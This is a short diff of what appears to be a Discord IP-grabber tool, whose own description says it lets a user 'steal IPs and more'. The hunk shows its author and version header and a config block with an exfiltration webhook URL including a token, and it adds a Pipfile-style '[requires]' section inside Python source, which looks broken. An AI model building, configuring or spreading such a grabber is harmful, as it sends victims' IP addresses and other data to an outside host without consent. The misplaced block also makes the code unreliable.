@@ -13,6 +13,9 @@ __description__ = "A simple application which allows you to steal IPs and more b
 __version__ = "v2.0"
 __author__ = "DeKrypt"
 
+[requires]
+python_version = "3.9"
+
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1222833253430460416/RYURZtndSfZ48y5OjxoV1uq4KskCM27DskQ2qj6dybnIuJyGv0sPCb6WBJH0EvfqZ5Pl",
